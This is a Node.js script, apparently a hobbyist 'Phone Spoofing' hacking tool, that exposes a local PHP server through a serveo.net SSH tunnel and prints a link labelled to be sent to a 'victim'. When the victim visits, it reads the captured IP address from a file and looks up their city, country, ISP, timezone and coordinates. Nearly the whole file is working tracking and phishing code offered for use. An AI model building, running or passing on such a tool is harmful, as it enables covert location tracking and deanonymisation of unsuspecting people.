// Copyright© 2019 By Fajar Firdaus
// Please don't recode my program because i take a long time to finish this project

// Some depencies
var cmd = require('shelljs');
var f = require('fs');
var r = require('readline');
var c = require('colors');
var req = require("request");
var loading = require("ora");
var style = require("chalk");
var notif = require("beeper");
var check = require("log-symbols")
var cow = require("cowsay")

console.log(cow.say({
	text : "Hello Users :)",
	e : "o0",
	T : "V"
}))

console.log(style.bgBlack(check.warning, "[ Phone Spoofing By Fajar Firdaus ]"))

console.log(c.rainbow("[:———————————————————:]"))
console.log(style.bgBlue("[Coder] Fajar Firdaus"))
console.log(style.bgBlue("[Fb] Fajar Firdaus"))
console.log(style.bgBlue("[IG] fajar_firdaus_7"))
console.log(style.bgBlue("[YT] iTech7732"))
console.log(c.rainbow("[:———————————————————:]"))

// Create user input interface 
const user = r.createInterface({
    input : process.stdin,
    output : process.stdout
});

var userinput = c.rainbow('[ Input Website Name ] >_  ');

user.question(userinput, (q) => {
    cmd.exec("php -S localhost:8000 > /dev/null 2>&1 & ");
    cmd.exec("ssh -o ServerAliveInterval=60 -R " + `${q}` + ":80:localhost:8000 serveo.net > /dev/null 2>&1 &");
    console.log(c.blue("[ Send This Link To Victim ] > " + `${q}` + ".serveo.net"));
    loading("Listening...\n\n").start();
    f.watchFile("result.txt", function(current, previous){
    var a = f.readFileSync("result.txt", "utf8");
    var ipvictim = a.substr(7, 13);
    req("http://ip-api.com/json/" + ipvictim, function(error, response, body){
    var js = JSON.parse(body);
    console.log(c.red("\n[!] Type Ctrl + c To Exit"))
    console.log(style.cyan(check.success, "[IP] : " + ipvictim));
    notif(3);
    console.log(style.green("[:–––––––––––––––––––:]"))
    console.log(style.white(check.warning, "{ City } > " + js["city"]));
    console.log(style.white(check.warning, "{ Country } > " + js["country"]));
    console.log(style.white(check.warning, "{ ISP } > " + js["as"]));
    console.log(style.white(check.warning, "{ Timezone } > " + js["timezone"]));
    console.log(style.white(check.warning, "{ Coordinate } > " + js["lat"] + "." + js["lon"]));
    console.log(style.white(check.warning, "{ IP } > " + js["query"]));
    console.log(style.green("[:–––––––––––––––––––:]"))
});
});
});